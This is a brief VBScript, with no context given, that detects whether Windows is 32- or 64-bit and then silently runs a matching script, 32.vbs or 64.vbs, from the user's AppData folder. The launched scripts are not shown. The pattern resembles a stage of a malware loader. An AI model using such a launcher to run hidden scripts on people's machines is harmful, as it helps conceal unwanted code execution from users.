Set st = CreateObject("Wscript.Shell") 
r = "x64" 
If st.ExpandEnvironmentStrings("%PROCESSOR_ARCHITECTURE%") = "x86" AND st.ExpandEnvironmentStrings("%PROCESSOR_ARCHITEW6432%") = "%PROCESSOR_ARCHITEW6432%" Then r = "x86" 
If r = "x64" then st.run"%appdata%\64.vbs" else st.run"%appdata%\32.vbs"